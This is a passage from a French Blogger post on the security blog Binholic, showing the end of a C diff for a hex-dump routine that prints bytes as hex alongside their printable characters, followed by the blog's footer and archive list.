+        // we print the second part of the line
+        if ( (idx_bytes + 1) % align == 0 || idx_bytes == nbytes - 1 ) {
+            // we print spaces if we arrived at end of bytes
+            if (idx_bytes == nbytes - 1) {
+                // compute the number of spaces to show
+                n_disp = align - (nbytes % align);
+                n_disp = (nbytes % align) ? n_disp : 0;
+                for (j = 0; j < n_disp; j++)
+                    printf("   ");
+            }
+            // separation
+            printf ("| ");
+            // second part of line is corresponding character
+            for (j = last; j < last + align && j < nbytes;  j++) {
+                if (isprint(bytes[j]))
+                    printf ("%c", bytes[j]);
+                else
+                    putchar ('.');
+            }
+            putchar ('\n');
+            last = idx_bytes + 1;
+        }
+    }
+
+    return 0;
+} Publié par m_101 à 14:56 0 commentaires Envoyer par e-mail BlogThis! Partager sur Twitter Partager sur Facebook Liens vers cet article Réactions :   Articles plus anciens Accueil Inscription à : Articles ( Atom ) Binholic : RSS Me :) Articles Atom Articles Commentaires Atom Commentaires Membres Qui êtes-vous ? m_101 Afficher mon profil complet Archives du blog ▼  2017 ( 2 ) ▼  mai ( 1 ) Notes on abusing exit handlers, bypassing pointer ... ►  mars ( 1 ) ►  2013 ( 10 ) ►  décembre ( 3 ) ►  août ( 1 ) ►  juin ( 1 ) ►  mars ( 5 ) ►  2012 ( 1 ) ►  juillet ( 1 ) ►  2011 ( 25 ) ►  décembre ( 4 ) ►  novembre ( 2 ) ►  juillet ( 4 ) ►  juin ( 5 ) ►  avril ( 5 ) ►  mars ( 2 ) ►  février ( 3 ) ►  2010 ( 32 ) ►  décembre ( 1 ) ►  novembre ( 6 ) ►  octobre ( 4 ) ►  août ( 5 ) ►  juillet ( 4 ) ►  juin ( 7 ) ►  mai ( 1 ) ►  avril ( 4 ) ►  2009 ( 1 ) ►  juin ( 1 ) Fourni par Blogger.
